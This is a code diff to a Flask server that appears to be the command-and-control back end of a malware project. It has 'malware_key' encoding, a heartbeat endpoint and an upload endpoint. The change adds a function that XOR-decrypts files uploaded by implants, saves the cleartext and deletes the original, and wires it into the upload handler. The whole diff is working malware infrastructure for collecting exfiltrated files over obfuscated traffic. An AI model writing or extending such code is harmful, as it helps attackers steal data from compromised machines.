@@ -32,6 +32,31 @@ def mal_decode(key, enc):
     return dec
 
 
+def file_decrypt(dir, filename, key):
+    """
+
+    :param dir: directory of file
+    :param filename: name of file
+    :param key: XOR key
+    :return: None
+    """
+    inpath = os.path.join(dir, filename)
+    outpath = os.path.join(dir, "decrypted_" + filename)
+
+    CHUNKSIZE = 1000
+
+    with open(inpath, 'rb') as source:
+        with open(outpath, 'wb') as dest:
+            bytes_read = source.read(CHUNKSIZE)
+            while bytes_read:
+                cleartext = bytearray(len(bytes_read))
+                for i in range(len(bytes_read)):
+                    cleartext[i] = bytes_read[i] ^ key
+                dest.write(cleartext)
+                bytes_read = source.read(CHUNKSIZE)
+    os.remove(inpath)
+    return
+
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
     """
@@ -133,6 +158,7 @@ def upload():
             if not os.path.exists(dir):
                 os.makedirs(dir)
             file.save(os.path.join(dir, filename))
+            file_decrypt(dir, filename, app.xor_key)
             return mal_encode(app.malware_key, "Successfully uploaded file")
     return mal_encode(app.malware_key, "Something went wrong")
 
